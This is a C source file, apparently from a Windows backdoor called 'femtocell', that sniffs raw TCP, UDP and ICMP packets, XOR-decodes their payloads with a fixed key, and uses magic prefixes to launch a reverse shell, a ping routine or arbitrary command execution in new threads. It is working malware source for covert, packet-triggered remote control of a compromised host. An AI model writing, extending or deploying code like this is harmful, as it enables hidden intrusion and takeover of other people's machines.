#include "femtocell.h"

void compare(int payloadLength, char* data, struct sockaddr_in* hostIP)
{
	if (payloadLength > 6)
	{
		if (strncmp(data, SHELL, 6) == 0 || strncmp(data, PING, 6) == 0)
		{
			char* rip = (char*)malloc(payloadLength - 6);
			strncpy(rip, data + 6, payloadLength - 6);
#ifdef _DEBUG
			printf("%s", data);
#endif
			if (strncmp(data, SHELL, 6) == 0)
				CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)&rev, rip, 0, NULL);
			else
			{
				printf("in compare %s", rip);
				CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)&ping, rip, 0, NULL);
			}

		}
		else if (strncmp(data, COMMAND, 6) == 0)
		{
			char* cmd = (char*)malloc(payloadLength - 6);
			strncpy(cmd, data + 6, payloadLength - 6);
#ifdef _DEBUG
			printf("%s", cmd);
#endif
			CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)&exec, cmd, 0, NULL);
		}

	}
}


void handleTCP(char* buffer, struct ip_hdr_s* ip_header, struct sockaddr_in* hostIP)
{
	struct tcp_hdr_s* tcp_header = (struct tcp_hdr_s*)(buffer + BUFFER_OFFSET_L4);
	uint16_t flag = (uint16_t)tcp_header->th_flags;
	if (flag >> 3 % 2)
	{
		int tcp_header_size = 4 * ((int)tcp_header->th_off);
		int payloadLength = ntohs(ip_header->ip_len) - IP_HEADER_SIZE - tcp_header_size; // ntohs(ip_header->ip_len)
		char* data = (char*)(buffer + (BUFFER_OFFSET_L4 + tcp_header_size));
#ifndef _DEBUG
		XORCipher(data, XOR_KEY, payloadLength);
#endif
		data[payloadLength - 1] = '\0';
		compare(payloadLength, data, hostIP);
	}
}


void handleUDP(char* buffer, struct ip_hdr_s* ip_header, struct sockaddr_in* hostIP)
{
	struct udp_hdr_s* udp_header = (struct udp_hdr_s*)(buffer + BUFFER_OFFSET_L4);
	char* data = (char*)(buffer + BUFFER_OFFSET_UDP_DATA);
	int payloadLength = ntohs(ip_header->ip_len) - IP_HEADER_SIZE - BUFFER_SIZE_UDP;
#ifndef _DEBUG
	XORCipher(data, XOR_KEY, payloadLength);
#endif
	data[payloadLength - 1] = '\0';
	compare(payloadLength, data, hostIP);
}


void handleICMP(char* buffer, struct ip_hdr_s* ip_header, struct sockaddr_in* hostIP)
{
	struct icmp_hdr_s* icmp_header = (struct icmp_hdr_s*)(buffer + BUFFER_OFFSET_L4);
	uint8_t scode = icmp_header->code;
	uint8_t stype = icmp_header->type;
	if (scode == ICMP_CODE && stype == ICMP_REQ)
	{
		char* data = (char*)(buffer + BUFFER_OFFSET_ICMP_DATA);
		int payloadLength = ntohs(ip_header->ip_len) - IP_HEADER_SIZE - BUFFER_SIZE_ICMP;
#ifndef _DEBUG
		XORCipher(data, XOR_KEY, payloadLength);
#endif
		data[payloadLength - 1] = '\0';
		compare(payloadLength, data, hostIP);
	}
}
